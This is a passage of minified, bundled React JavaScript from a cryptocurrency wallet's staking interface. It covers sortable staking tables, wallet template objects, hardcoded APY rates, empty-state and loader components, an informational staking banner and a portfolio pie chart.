                };
            case ote:
                return {
                    list: t.sort(( (e, t) => {
                        const a = undefined
                          , n = undefined;
                        return getApyNumFromStr(e.validatorAPY) > getApyNumFromStr(t.validatorAPY) ? 1 : -1
                    }
                    ))
                };
            case cte:
                return {
                    list: t.sort(( (e, t) => {
                        var a, n;
                        const r = "minAmountInFiat"in e && null !== (a = e.minAmountInFiat) && void 0 !== a ? a : "-1"
                          , l = "minAmountInFiat"in t && null !== (n = t.minAmountInFiat) && void 0 !== n ? n : "-1";
                        return parseFloat(r) > parseFloat(l) ? -1 : 1
                    }
                    ))
                };
            case ute:
                return {
                    list: t.sort(( (e, t) => {
                        var a, n;
                        const r = "minAmountInFiat"in e && null !== (a = e.minAmountInFiat) && void 0 !== a ? a : "-1"
                          , l = "minAmountInFiat"in t && null !== (n = t.minAmountInFiat) && void 0 !== n ? n : "-1";
                        return parseFloat(r) > parseFloat(l) ? 1 : -1
                    }
                    ))
                };
            default:
                return {
                    list: t
                }
            }
        }
          , dte = a.p + "ce7f7f5ae5edd9fd724d7ee7de954d5e.svg"
          , mte = a.p + "7eedda913777bac59b60523d9b5efccc.svg"
          , pte = a.p + "69d63d0c6fd274472ba0c08b2318093e.svg"
          , fte = a.p + "7d515ec677b30a527d11ce33d5a24ae9.svg"
          , sortTypeChangeHandler = (e, t, a) => {
            const n = undefined;
            a(getNextSortType({
                type: e,
                actualSortType: t
            }))
        }
          , getSortIcon = e => {
            let {signOfActivity: t, sortType: a} = e;
            return null != a && a.includes("UP") ? t ? dte : mte : t ? pte : fte
        }
          , Ete = a.p + "882d709864b3dafc8b0f6e4d3481bc4d.svg"
          , hte = "staking-block_tableContainer_ByHSM"
          , yte = "staking-block_tbody_1pCc6"
          , vte = "staking-block_gradient_3ghaK"
          , _te = "staking-block_title_1zH7x"
          , wte = "staking-block_tooltip_3kphj"
          , bte = "staking-block_tableSortableHeader_1huSC"
          , kte = "staking-block_active_39mWm"
          , Ste = "staking-block_withHover_2iTcb"
          , Cte = "staking-block_textLight_Zxa3y"
          , Nte = "staking-block_textBold_1DABM"
          , Tte = "staking-block_hiddenTableCell_14szf"
          , Ate = "staking-block_defaultTableCell_LtcLu"
          , xte = "staking-block_walletContainer_10uGv"
          , Ite = "staking-block_ticker_1Cnoh"
          , Pte = "staking-block_address_1IJJt"
          , TableHead = e => {
            let {sortTypeChangeHandler: t, sortType: a} = e;
            const n = a === rte || a === ste
              , r = a === ite || a === ote
              , l = a === cte || a === ute
              , s = (0,
            O.useMemo)(( () => getSortIcon({
                signOfActivity: n,
                sortType: a
            })), [n, a])
              , i = (0,
            O.useMemo)(( () => getSortIcon({
                signOfActivity: r,
                sortType: a
            })), [r, a])
              , o = (0,
            O.useMemo)(( () => getSortIcon({
                signOfActivity: l,
                sortType: a
            })), [l, a]);
            return O.createElement("thead", null, O.createElement("tr", null, O.createElement("th", {
                className: Ht()(Vee)
            }, O.createElement("div", {
                className: Ht()(bee, Aee, bte, _te, n && kte),
                onClick: () => t ? t(rte) : void 0
            }, t && O.createElement("img", {
                src: s,
                width: 16,
                height: 16,
                alt: "sort icon"
            }), "CRYPTO")), O.createElement("th", {
                className: Ht()(_te)
            }, "lock-up period"), O.createElement("th", null, O.createElement("div", {
                className: Ht()(bee, Cee, Aee, _te, bte, r && kte),
                onClick: () => t ? t(ite) : void 0
            }, t && O.createElement("img", {
                src: i,
                width: 16,
                height: 16,
                alt: "sort icon"
            }), "APY", O.createElement(tooltip, {
                classNameWrapper: Ht()(wte),
                text: "Average annual interest rate",
                width: "150px"
            }, O.createElement("img", {
                src: Ete,
                width: 16,
                height: 16,
                alt: "svg tooltip"
            })))), O.createElement("th", null, O.createElement("div", {
                className: Ht()(bee, Nee, Aee, _te, bte, l && kte),
                onClick: () => t ? t(cte) : void 0
            }, t && O.createElement("img", {
                src: o,
                width: 16,
                height: 16,
                alt: "sort icon"
            }), "Min amount"))))
        }
          , Lte = a.p + "a8629d6adf4da5efb6f319ff9f171ef2.svg"
          , Fte = "NoSearchResult_container_7em7v"
          , NoSearchResult_NoSearchResult = e => {
            let {sortedList: t, searchValue: a, stakingInfoIsLoading: n} = e;
            return !n && a && t && !t.length ? O.createElement("div", {
                className: Fte
            }, O.createElement("img", {
                src: Lte,
                width: 64,
                height: 64,
                alt: "no search result icon"
            }), O.createElement("p", null, 'No results found for "', a, '"')) : null
        }
          , TableRow = e => {
            let {lockUpPeriod: t, path: a, buttonTitle: n, minAmount: r, minAmountInFiat: l, validatorAPY: s, ticker: i, walletTitle: o, uuid: c, wallet: u} = e;
            const {localCurrency: d} = local_currency_useLocalCurrency()
              , m = (0,
            $.v9)(ru)
              , {handleGo: p} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            });
            let f;
            m.some((e => e.uuid === c)) || (f = p({
                path: (0,
                M.RU)("/buy"),
                wallet: u,
                isNewWallet: "now" !== i,
                isNewToken: "now" === i,
                parentWallet: "now" !== i ? null : {
                    currency: "bnb"
                },
                fromWallet: !1
            }));
            const E = getTicker({
                ticker: i
            })
              , h = (0,
            O.useMemo)(( () => 0 === r), [r]);
            return O.createElement("tr", null, O.createElement("td", null, O.createElement("div", {
                className: Ht()(Nte, bee, Aee)
            }, O.createElement(IconCurrency, {
                currency: i
            }), O.createElement("div", {
                className: xte
            }, O.createElement("span", {
                className: Wee
            }, o), O.createElement("span", {
                className: Ite
            }, E)))), O.createElement("td", null, t), O.createElement("td", {
                className: Ht()(Uee, Nte)
            }, "up to ", s), O.createElement("td", {
                className: Ht()(Ate)
            }, h ? "No min amount" : O.createElement(O.Fragment, null, l, " ", d.toUpperCase(), O.createElement("div", {
                className: Ht()(Cte)
            }, r, " ", i.toUpperCase()))), O.createElement("td", {
                className: Ht()(Tte)
            }, f ? O.createElement(Yl, {
                color: "light-blue",
                size: "small",
                onClick: f
            }, n) : O.createElement(Y.OL, {
                to: a
            }, O.createElement(Yl, {
                color: "light-blue",
                size: "small"
            }, n))))
        }
          , Wte = {
            trx: {
                uuid: "uuid1",
                title: "TRON",
                currency: "trx",
                balance: "0",
                address: "",
                type: "TRX_WALLET",
                privateKey: {
                    mnemonic: "",
                    privateKey: ""
                },
                subWallets: []
            },
            atom: {
                uuid: "uuid2",
                title: "Cosmos",
                currency: "atom",
                balance: "0",
                address: "",
                type: "BTC_LIKE_WALLET",
                subWalletsHidden: !0,
                privateKey: "",
                subWallets: []
            },
            xtz: {
                uuid: "uuid3",
                title: "Tezos",
                currency: "xtz",
                balance: "0",
                address: "",
                type: "BTC_LIKE_WALLET",
                subWalletsHidden: !0,
                privateKey: "",
                subWallets: []
            },
            one: {
                uuid: "uuid4",
                title: "Harmony",
                currency: "one",
                balance: "0",
                address: "",
                type: "BTC_LIKE_WALLET",
                subWalletsHidden: !0,
                privateKey: "",
                subWallets: []
            },
            ont: {
                uuid: "uuid5",
                title: "Ontology",
                currency: "ont",
                balance: "0",
                address: "",
                type: "OVERALL_WALLET",
                subWalletsHidden: !1,
                privateKey: "",
                subWallets: []
            },
            eth: {
                uuid: "uuid6",
                title: "Ethereum",
                currency: "eth",
                balance: "0",
                address: "",
                type: "ETH_LIKE_WALLET",
                subWalletsHidden: !1,
                multisigsShow: !0,
                privateKey: "",
                subWallets: []
            },
            "ada-shelley": {
                uuid: "uuid7",
                title: "Cardano Shelley",
                currency: "ada-shelley",
                balance: "0",
                address: "",
                type: "ADA_SHELLEY_WALLET",
                subWalletsHidden: !0,
                privateKey: {
                    mnemonic: ""
                },
                rewardAddress: "",
                subWallets: []
            },
            zil: {
                uuid: "uuid8",
                title: "Zilliqa",
                currency: "zil",
                balance: "0",
                address: "",
                type: "BTC_LIKE_WALLET",
                subWalletsHidden: !0,
                privateKey: {
                    privateKey: ""
                },
                subWallets: []
            },
            "now-e68": {
                uuid: "uuid9",
                title: "NOW Token",
                currency: "now-e68",
                balance: "0",
                address: "",
                type: "BNB_TOKEN_SUBWALLET",
                subWalletsHidden: !0,
                privateKey: {
                    mnemonic: null,
                    privateKey: ""
                },
                family: "bnb",
                ticker: "now",
                subWallets: []
            },
            kmd: {
                uuid: "uuid10",
                title: "Komodo",
                currency: "kmd",
                balance: "0",
                address: "",
                type: "BTC_LIKE_WALLET",
                subWalletsHidden: !0,
                privateKey: "",
                publicKey: "",
                subWallets: []
            },
            clo: {
                uuid: "uuid11",
                title: "Callisto",
                currency: "clo",
                balance: "0",
                address: "",
                type: "ETH_LIKE_WALLET",
                subWalletsHidden: !1,
                multisigsShow: !0,
                privateKey: "",
                subWallets: []
            },
            qtum: {
                uuid: "uuid12",
                title: "Qtum",
                currency: "qtum",
                balance: "0",
                address: "",
                type: "BTC_LIKE_WALLET",
                subWalletsHidden: !0,
                privateKey: ""
            }
        }
          , Rte = {
            trx: "3.9%",
            atom: "5%",
            xtz: "5.5%",
            one: "8.3%",
            ont: "24.9%",
            eth: "2.5%",
            "ada-shelley": "2.5%",
            ada: "2.5%",
            zil: "11.4%",
            "now-e68": "25%",
            now: "25%",
            kmd: "5.1%",
            clo: "7%",
            qtum: "6.79%"
        }
          , useNewStakingTableRowInfo = e => {
            let {stakingWallets: t} = e;
            const {convertToFiat: a} = useConverter()
              , {localCurrency: n} = local_currency_useLocalCurrency()
              , r = undefined;
            return {
                tableRowInfoList: (0,
                O.useMemo)(( () => t.map((e => {
                    const t = getURLForNewStakingAction({
                        ticker: e.ticker || e.currency,
                        balance: e.balance,
                        uuid: e.uuid
                    })
                      , r = getButtonTitleForNewStakingAction({
                        ticker: e.currency,
                        balance: e.balance,
                        withTicker: !1
                    })
                      , l = getMinStakingAmountByTicker({
                        ticker: getTicker(e)
                    })
                      , s = Rte[e.currency]
                      , i = getStakingLockUpPeriodByTicker({
                        ticker: e.ticker || e.currency
                    })
                      , o = (0,
                    Ko.yF)(a(l, e, n) || 0, 2)
                      , c = getTicker(e);
                    return {
                        uuid: e.uuid,
                        path: t,
                        walletTitle: e.title,
                        buttonTitle: r,
                        ticker: c,
                        minAmount: l,
                        validatorAPY: s,
                        lockUpPeriod: i,
                        minAmountInFiat: o,
                        wallet: e
                    }
                }
                ))), [t, a, n])
            }
        }
          , TableBody = e => {
            let {stakingWallets: t, searchValue: a, sortType: n} = e;
            const r = (0,
            O.useMemo)(( () => filterWallets(t, a)), [a, t])
              , {tableRowInfoList: l} = useNewStakingTableRowInfo({
                stakingWallets: r
            })
              , {list: s} = useTableSort({
                list: l,
                sortType: n || nte
            });
            return O.createElement("tbody", {
                className: Ste
            }, Boolean(s.length) && s.map((e => O.createElement(TableRow, {
                key: e.uuid,
                path: e.path,
                walletTitle: e.walletTitle,
                buttonTitle: e.buttonTitle,
                ticker: e.ticker,
                minAmount: e.minAmount,
                validatorAPY: e.validatorAPY,
                lockUpPeriod: e.lockUpPeriod,
                minAmountInFiat: e.minAmountInFiat,
                uuid: e.uuid,
                wallet: e.wallet
            }))), O.createElement(NoSearchResult_NoSearchResult, {
                searchValue: a,
                sortedList: s,
                stakingInfoIsLoading: !1
            }))
        }
          , Bte = null
          , NewStakingTable = e => {
            let {searchValue: t} = e;
            const [a,n] = (0,
            O.useState)(nte)
              , r = (0,
            $.v9)(ru)
              , l = (0,
            O.useMemo)(( () => {
                const e = Object.keys(Wte)
                  , t = {
                    trx: {
                        balance: "",
                        uuid: ""
                    },
                    atom: {
                        balance: "",
                        uuid: ""
                    },
                    xtz: {
                        balance: "",
                        uuid: ""
                    },
                    one: {
                        balance: "",
                        uuid: ""
                    },
                    ont: {
                        balance: "",
                        uuid: ""
                    },
                    eth: {
                        balance: "",
                        uuid: ""
                    },
                    "ada-shelley": {
                        balance: "",
                        uuid: ""
                    },
                    zil: {
                        balance: "",
                        uuid: ""
                    },
                    "now-e68": {
                        balance: "",
                        uuid: ""
                    },
                    kmd: {
                        balance: "",
                        uuid: ""
                    },
                    clo: {
                        balance: "",
                        uuid: ""
                    },
                    qtum: {
                        balance: "",
                        uuid: ""
                    }
                };
                for (let a = 0; a < e.length; a += 1) {
                    const n = e[a];
                    t[n] = Wte[n];
                    for (let e = 0; e < r.length; e += 1) {
                        const a = r[e];
                        if (a.currency === n && (0,
                        Ko.eg)(a.balance, t[n].balance)) {
                            t[n].uuid = a.uuid;
                            t[n].balance = a.balance
                        }
                    }
                }
                return Object.values(t)
            }
            ), [r]);
            return O.createElement("div", {
                className: hte
            }, O.createElement("table", {
                className: Ht()(Dee, Mee, Gee)
            }, O.createElement(TableHead, {
                sortTypeChangeHandler: e => sortTypeChangeHandler(e, a, n),
                sortType: a
            })), O.createElement("div", {
                className: yte
            }, O.createElement("table", {
                className: Ht()(Dee, Mee, Gee)
            }, O.createElement(TableBody, {
                searchValue: t,
                stakingWallets: l,
                sortType: a
            }))), O.createElement("div", {
                className: vte
            }))
        }
          , Ote = "TableHead_active_Ym_Fj"
          , Dte = "TableHead_wrapper_12MIS"
          , Mte = "TableHead_sortableWrapper_2-HFK"
          , Ute = "TableHead_tooltip_3A1zU"
          , Gte = "TableHead_biggestCell_T5bfG"
          , Vte = "TableHead_bigCell_23P6H"
          , Kte = "TableHead_lastCell_3X1aT"
          , Hte = "TableHead_smallCell_3gl7W"
          , TableHead_TableHead_TableHead = e => {
            let {sortType: t, sortTypeChangeHandler: a} = e;
            const n = t === rte || t === ste
              , r = t === ite || t === ote
              , l = (0,
            O.useMemo)(( () => getSortIcon({
                signOfActivity: n,
                sortType: t
            })), [n, t])
              , s = (0,
            O.useMemo)(( () => getSortIcon({
                signOfActivity: r,
                sortType: t
            })), [r, t]);
            return O.createElement("div", {
                className: Dte
            }, O.createElement("div", {
                className: Ht()(n && Ote, Mte, Gte),
                onClick: () => a ? a(rte) : void 0
            }, a && O.createElement("img", {
                src: l,
                width: 16,
                height: 16,
                alt: "sort icon"
            }), "WALLET"), O.createElement("div", {
                className: Ht()(r && Ote, Mte, Hte),
                onClick: () => a ? a(ite) : void 0
            }, a && O.createElement("img", {
                src: s,
                width: 16,
                height: 16,
                alt: "sort icon"
            }), "APY", O.createElement(tooltip, {
                classNameWrapper: Ht()(Ute),
                text: "Staking validator or deposit service",
                width: "150px"
            }, O.createElement("img", {
                src: Ete,
                width: 16,
                height: 16,
                alt: "svg tooltip"
            }))), O.createElement("div", {
                className: Vte
            }, "AVAILABLE"), O.createElement("div", {
                className: Vte
            }, "DEPOSITED"), O.createElement("div", {
                className: Ht()(Vte, Kte)
            }, "REWARDS"))
        }
          , zte = a.p + "b74cc7b52ab6d1d1b9df50294dc8f92f.svg"
          , jte = "EmptyStakingWallets_container_3A4jP"
          , $te = "EmptyStakingWallets_text_2xR2N"
          , Zte = "EmptyStakingWallets_rotating_gJN88"
          , EmptyStakingWallets_EmptyStakingWallets = e => {
            let {searchValue: t, sortedList: a, stakingInfoIsLoading: n} = e;
            return n || t || a && null != a && a.length ? null : O.createElement("div", {
                className: jte
            }, O.createElement("img", {
                src: zte,
                width: 182,
                height: 113,
                alt: "Empty Staking Wallets Icon"
            }), O.createElement("span", {
                className: $te
            }, "You don’t have any savings"), O.createElement(Y.OL, {
                exact: !0,
                to: "/app/earn"
            }, O.createElement(Yl, {
                size: "large",
                color: "blue",
                radius: "large"
            }, "Earn now")))
        }
          , Yte = a.p + "076da82fac4fe7e552b13369fde0609a.svg"
          , StakingInfoLoader = e => {
            let {visible: t} = e;
            return t ? O.createElement("div", {
                className: jte
            }, O.createElement("img", {
                className: Zte,
                src: Yte,
                height: 113,
                width: 113,
                alt: "staking info loader icon"
            }), O.createElement("span", {
                className: $te
            }, "Updating savings info")) : null
        }
          , qte = a.p + "7371ebbc46cb61ad6d834c25baeb2d87.svg"
          , Xte = "TableRow_wrapper_1qy2F"
          , Qte = "TableRow_walletContainer_1vU9g"
          , Jte = "TableRow_walletTitleWrapper_YlssD"
          , eae = "TableRow_walletTitle_UbEh_"
          , tae = "TableRow_apy_2Psau"
          , aae = "TableRow_address_2T63o"
          , nae = "TableRow_secondaryText_2mBGv"
          , rae = "TableRow_bigCell_3gPeo"
          , lae = "TableRow_lastCell_WhF7s"
          , sae = "TableRow_link_3OXkB"
          , TableRow_TableRow_TableRow = e => {
            let {walletTitle: t, walletAddress: a, parentWalletTitle: n, validatorAPY: r, available: l, rewards: s, rewardsDate: i, deposited: o, frozenBalance: c, frozenUntilDate: u, ticker: d, uuid: m} = e;
            const p = getTicker({
                ticker: d
            })
              , f = `${(0,
            M.RU)()}/receive?wallet=${m}&anchor=staking`;
            return O.createElement(Y.OL, {
                to: f,
                className: sae
            }, O.createElement("div", {
                className: Xte
            }, O.createElement("div", {
                className: Ht()(Qte)
            }, O.createElement(IconCurrency, {
                currency: d
            }), O.createElement("div", {
                className: Jte
            }, O.createElement("span", {
                className: eae
            }, t), O.createElement("span", {
                className: aae
            }, a), O.createElement("span", null, n))), O.createElement("div", {
                className: tae
            }, r), O.createElement("div", {
                className: rae
            }, l, " ", p.toUpperCase()), O.createElement("div", {
                className: rae
            }, o, " ", p.toUpperCase(), "—" !== c && O.createElement("div", {
                className: nae
            }, O.createElement("img", {
                src: qte,
                width: 12,
                height: 12,
                alt: "frozen balance icon"
            }), c, " ", p.toUpperCase(), " /", u)), O.createElement("div", {
                className: Ht()(rae, lae)
            }, s, " ", p.toUpperCase(), "—" !== i && O.createElement("div", {
                className: nae
            }, i))))
        }
          , mapStakeInfoToUnifiedForm = e => {
            let {stakeInfo: t} = e;
            if (t && "type"in t.dto && "STAKING_INFO_SUCCESS" === t.dto.type) {
                let e, t, a;
                const n = undefined;
                let r, l, s;
                return {
                    validatorAPY: "—",
                    available: "—",
                    rewards: "—",
                    rewardsDate: "—",
                    deposited: "—",
                    frozenBalance: "—",
                    frozenUntilDate: "—"
                }
            }
        }
          , useStakingTableRowInfo = e => {
            let {stakingWallets: t} = e;
            const a = (0,
            $.v9)(cx)
              , n = (0,
            $.v9)(lu)
              , r = [];
            t.forEach((e => {
                const t = a({
                    uuid: e.uuid
                });
                if (t) {
                    const a = mapStakeInfoToUnifiedForm({
                        stakeInfo: t
                    });
                    if (a) {
                        var l, s;
                        const {validatorAPY: t, available: i, rewards: o, rewardsDate: c, frozenUntilDate: u, frozenBalance: d, deposited: m} = a
                          , p = n(e.uuid)
                          , f = null == p ? void 0 : p.title
                          , E = " ..." + (null === (l = e.address) || void 0 === l || null === (s = l.slice(-4)) || void 0 === s ? void 0 : s.toLowerCase())
                          , h = {
                            walletTitle: e.title,
                            walletAddress: E,
                            parentWalletTitle: f,
                            validatorAPY: t,
                            available: i,
                            rewards: o,
                            rewardsDate: c,
                            deposited: m,
                            frozenBalance: d,
                            frozenUntilDate: u,
                            ticker: e.currency,
                            uuid: e.uuid
                        };
                        r.push(h)
                    }
                }
            }
            ));
            return {
                tableRowInfoList: r
            }
        }
          , TableBody_TableBody_TableBody = e => {
            let {stakingWallets: t, searchValue: a, sortType: n} = e;
            const r = (0,
            $.I0)()
              , l = (0,
            $.v9)(dx);
            (0,
            O.useEffect)((function updateStakeInfo() {
                r(lb.updateStakeInfoOnce())
            }
            ), []);
            const s = (0,
            O.useMemo)(( () => filterWallets(t, a)), [a, t])
              , {tableRowInfoList: i} = useStakingTableRowInfo({
                stakingWallets: s
            })
              , {list: o} = useTableSort({
                list: i,
                sortType: n || nte
            });
            return O.createElement("div", {
                className: yte
            }, Boolean(o.length) && o.map((e => O.createElement(TableRow_TableRow_TableRow, {
                key: e.uuid,
                walletTitle: e.walletTitle,
                walletAddress: e.walletAddress,
                parentWalletTitle: e.parentWalletTitle,
                validatorAPY: e.validatorAPY,
                available: e.available,
                rewards: e.rewards,
                rewardsDate: e.rewardsDate,
                deposited: e.deposited,
                frozenBalance: e.frozenBalance,
                frozenUntilDate: e.frozenUntilDate,
                ticker: e.ticker,
                uuid: e.uuid
            }))), O.createElement(NoSearchResult_NoSearchResult, {
                searchValue: a,
                sortedList: o,
                stakingInfoIsLoading: l
            }), O.createElement(EmptyStakingWallets_EmptyStakingWallets, {
                searchValue: a,
                sortedList: o,
                stakingInfoIsLoading: l
            }), O.createElement(StakingInfoLoader, {
                visible: Boolean(l && !o.length)
            }))
        }
          , StakingTable = e => {
            let {searchValue: t} = e;
            const [a,n] = (0,
            O.useState)(nte)
              , r = (0,
            $.v9)(ru);
            return O.createElement("div", {
                className: hte
            }, O.createElement(TableHead_TableHead_TableHead, {
                sortTypeChangeHandler: e => sortTypeChangeHandler(e, a, n),
                sortType: a
            }), O.createElement(TableBody_TableBody_TableBody, {
                searchValue: t,
                stakingWallets: r,
                sortType: a
            }), O.createElement("div", {
                className: vte
            }))
        }
          , getIsDevModeEnabled = () => !!(0,
        bu.ZP)("developer-mode-active")
          , getIsAvailableOnStageWithDevMode = () => (window.location.pathname.includes("tothemoon") || Boolean(!1)) && M.CM
          , iae = "staking-nav-panel_menu_2--Hu"
          , oae = "staking-nav-panel_disable_njKE-"
          , cae = "staking-nav-panel_searchWrapper_QEX80"
          , uae = "staking-nav-panel_search_23bh9"
          , dae = "staking-nav-panel_glassIcon_1EP9w"
          , mae = "staking-nav-panel_menuItem_1N2P1"
          , pae = "staking-nav-panel_rightSideWrapper__iuTG"
          , fae = "staking-nav-panel_loadingWrapper_3LSfp"
          , StakingNavPanel_StakingNavPanel = e => {
            let {searchValue: t, changeHandler: a} = e;
            const n = getIsAvailableOnStageWithDevMode()
              , r = (0,
            $.v9)(dx)
              , l = (0,
            j.k6)()
              , s = (0,
            O.useMemo)(( () => !!l.location.pathname.endsWith("staking") && r), [l.location.pathname, r]);
            return O.createElement(Menu_Menu, {
                className: iae
            }, O.createElement("div", null, O.createElement(MenuItem, {
                path: "/app/earn",
                title: "Start to Earn",
                className: mae
            }), n && O.createElement(MenuItem, {
                path: "/app/earn/staking",
                title: "Your Portfolio",
                className: mae
            })), O.createElement("div", {
                className: pae
            }, s && O.createElement("div", {
                className: fae
            }, O.createElement(loader, {
                visible: !0,
                width: 16
            }), "Updating"), O.createElement("div", {
                className: cae
            }, O.createElement(Ea, {
                className: Ht()(uae),
                defaultValue: t,
                placeholder: "Search",
                onChange: a
            }), O.createElement("div", {
                className: dae
            }, O.createElement("img", {
                src: cS,
                width: 16,
                height: 16,
                alt: "Glass"
            })))))
        }
          , StakingBlock_StakingBlock = () => {
            const {changeHandler: e, searchValue: t} = useSearchValue()
              , a = getIsAvailableOnStageWithDevMode();
            return O.createElement(O.Fragment, null, O.createElement(StakingNavPanel_StakingNavPanel, {
                changeHandler: e,
                searchValue: t
            }), O.createElement(j.rs, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/earn"
            }, O.createElement(NewStakingTable, {
                searchValue: t
            })), a && O.createElement(j.AW, {
                exact: !0,
                path: "/app/earn/staking",
                component: StakingTable
            }), O.createElement(j.AW, {
                component: _404
            })))
        }
          , Eae = "@earn"
          , hae = "earn"
          , gae = "@earn.SET_CLEAR_STORE.commit"
          , yae = "@earn.SET_TOTAL_STAKING_AMOUNT.commit"
          , vae = "@earn.SET_LOADING_START.commit"
          , _ae = "@earn.SET_LOADING_STOP.commit"
          , wae = "@earn.INITIALIZE_UPDATER"
          , bae = "@earn.UPDATE_STAKING_INFO_PERIODICALLY"
          , kae = "@earn.UPDATE_STAKING_INFO_ONE_ITEM.commit"
          , earnStateSelector = e => e.earn
          , Sae = (0,
        _t.P1)(earnStateSelector, (e => e.isLoading))
          , Cae = (0,
        _t.P1)(earnStateSelector, (e => e.totalStakingAmount))
          , Nae = a.p + "8413e4de02d5df0730e9e7d4b67dacbf.svg"
          , Tae = a.p + "1c19ce41d1c6f0f52440e47acd5e67c2.svg"
          , Aae = a.p + "29216cb04da17c6d1d5e39e75085ff50.svg"
          , xae = a.p + "1739506864942749c891fa8bc341dd19.svg"
          , Iae = "https://www.youtube.com/playlist?list=PLCD-oPASxr0eq6wlPL_81IouyK07eYxHl"
          , Pae = "https://wallet.barrons.space/staking/"
          , Lae = "more-info-banner_bannerContainer_3zlTb"
          , Fae = "more-info-banner_isVisible_1_ZO4"
          , Wae = "more-info-banner_text_1QY70"
          , Rae = "more-info-banner_title_UIjEO"
          , MoreInfoBanner_MoreInfoBanner = e => {
            let {isVisible: t, onClose: a} = e;
            return O.createElement("div", {
                className: Ht()(Lae, t && Fae)
            }, O.createElement("div", {
                className: Ht()(bee, Aee, See)
            }, O.createElement("span", {
                className: Ht()(Dee, Rae)
            }, "What is Staking?"), O.createElement("img", {
                src: xae,
                width: 24,
                height: 24,
                alt: "close icon",
                onClick: a
            })), O.createElement("span", {
                className: Ht()(Dee, Wae)
            }, "Staking is very similar to the bank deposit system and user rewards. You can get passive income for providing support of all operations on the blockchain."), O.createElement("div", {
                className: Ht()(bee, Nee)
            }, O.createElement("div", {
                className: Ht()(Bee)
            }, O.createElement("a", {
                href: Iae,
                target: "_blank",
                rel: "noreferrer"
            }, O.createElement(Yl, {
                color: "white"
            }, "Watch a Video"))), O.createElement("a", {
                href: Pae,
                target: "_blank",
                rel: "noreferrer"
            }, O.createElement(Yl, {
                color: "white"
            }, "Learn more"))))
        }
          , Bae = "chart-legend-item_text_1TJ5_"
          , Oae = "chart-legend-item_circle_3Ep18"
          , ChartLegendItem_ChartLegendItem = e => {
            let {color: t="#f1f4fd", text: a} = e;
            return O.createElement("div", {
                className: Ht()(bee, Fee)
            }, O.createElement("div", {
                className: Ht()(Oae, Oee),
                style: {
                    backgroundColor: t
                }
            }), O.createElement("div", {
                className: Ht()(Bae)
            }, a))
        }
          , Dae = ["#9371EC", "#FF7C9A", "#CB70C3", "#FFA96A", "#FFE45C"]
          , Mae = {
            dark: "#262728",
            light: "#F1F4FD"
        }
          , mapIncomingChartDatToFormattedChartData = e => {
            let {data: t, index: a} = e;
            return t ? 4 === a ? {
                title: t.title,
                percentage: "100",
                color: Dae[a]
            } : {
                title: t.title,
                percentage: String(t.percentage),
                color: Dae[a]
            } : {
                percentage: "0",
                title: "No active stakings"
            }
        }
          , getPieDataArr = e => {
            let {data: t} = e;
            const a = [];
            for (let e = 0; e < 5; e += 1) {
                const n = mapIncomingChartDatToFormattedChartData({
                    data: t ? t[e] : void 0,
                    index: e
                });
                a.push(n)
            }
            return a
        }
          , Uae = {
            container: "pie-chart_container_23Ie2",
            pieContainer: "pie-chart_pieContainer_33m9H",
            lineContainer: "pie-chart_lineContainer_2z-VA",
            pie: "pie-chart_pie_nK9Ke",
            noRound: "pie-chart_noRound_zfkVD",
            animate: "pie-chart_animate_2fJK4",
            p: "pie-chart_p_1m3PS",
            darkP: "pie-chart_darkP_3M1eu",
            emptyPieChart: "pie-chart_emptyPieChart_3_o7n"
        }
          , PieChart_PieChart = e => {
            let {data: t} = e;
            const a = (0,
            $.v9)(Ot)
              , n = null == t ? void 0 : t.slice(0, 5)
              , r = (0,
            O.useMemo)(( () => getPieDataArr({
                data: n
            }).reverse()), [n]);
            return O.createElement("div", {
                className: Ht()(bee, Tee, Uae.container)
            }, O.createElement("div", {
                className: Ht()(Uae.pieContainer)
            }, n && Boolean(n.length) ? O.createElement(O.Fragment, null, r.map((e => O.createElement("div", {
                key: `${e.percentage}${e.color}`,
                className: Ht()(Uae.lineContainer)
            }, O.createElement("div", {
                className: Ht()(Uae.pie),
                style: {
                    "--p": e.percentage,
                    "--c": e.color
                }
            })))), O.createElement("div", {
                className: Ht()(Uae.lineContainer)
            }, O.createElement("div", {
                className: Ht()(Uae.pie),
                style: {
                    "--p": "0",
                    "--c": Dae[n.length - 1]
                }
            }), O.createElement("div", {
                className: Ht()(Uae.lineContainer)
            }, O.createElement("div", {
                className: Ht()(Uae.pie, Uae.noRound, Uae.animate),
                style: {
                    "--p": "0",
                    "--c": Dae[n.length - 1]
                }
            })))) : O.createElement("div", {
                className: Uae.emptyPieChart
            })), O.createElement("div", {
                className: Ht()(bee, kee, Nee, Uae.chartDataContainer)
            }, n && Boolean(n.length) ? r.reverse().map((e => O.createElement(ChartLegendItem_ChartLegendItem, {
                key: `${e.color}${e.title}`,
                color: e.color,
                text: e.title
            }))) : O.createElement(ChartLegendItem_ChartLegendItem, {
                color: Mae[a],
                text: "No active stakings"
            })))
        }
          , Gae = [{
            title: "Binance Coin ≈ $ 200.07",
            percentage: 45
        }, {
            title: "Cardano Shelley ≈ $ 165.60",
            percentage: 65
        }, {
            title: "THORChain ≈ $ 75.86",
            percentage: 75
        }, {
            title: "Cosmos ≈ $ 65.15",
            percentage: 85
        }, {
            title: "Other ≈ $ 21.32",
            percentage: 87
        }, {
            title: "Other ≈ $ 21.32",
            percentage: 90
        }, {
            title: "Other ≈ $ 21.32",
            percentage: 100
        }]
          , Vae = "total-amount-block_chart_3pw-8"
          , Kae = "total-amount-block_chartDataContainer_1RAt5"
          , Hae = "total-amount-block_balanceAmount_2e51V"
          , zae = "total-amount-block_tooltip_7G5vM"
          , jae = "total-amount-block_stakingTitle_5MCLt"
          , $ae = "total-amount-block_title_1Zn3x"
          , TotalAmountBlock_TotalAmountBlock = () => {
            const e = (0,
            $.v9)(Cae)
              , [t,a] = (0,
            O.useState)(!Boolean(Gae.length))
              , n = (0,
            $.v9)(Ot)
              , r = (0,
            O.useMemo)(( () => "dark" === n), [n]);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(bee, See)
            }, O.createElement("h1", {
                className: Ht()(Dee, $ae)
            }, "Your staking"), O.createElement("a", {
                onClick: () => a(!0)
            }, "What is staking?")), !e && O.createElement("div", {
                className: Ht()(bee, See)
            }, O.createElement("div", {
                className: Ht()(bee, xee)
            }, O.createElement("div", {
                className: Ht()(bee, Aee)
            }, O.createElement("img", {
                className: Ht()(Bee),
                src: r ? Tae : Nae,
                width: 48,
                height: 48,
                alt: "stock portfolio Logo"
            }), O.createElement("div", null, O.createElement("div", {
                className: Ht()(bee, Aee, Bee)
            }, O.createElement("span", {
                className: Ht()(Dee, Oee, jae)
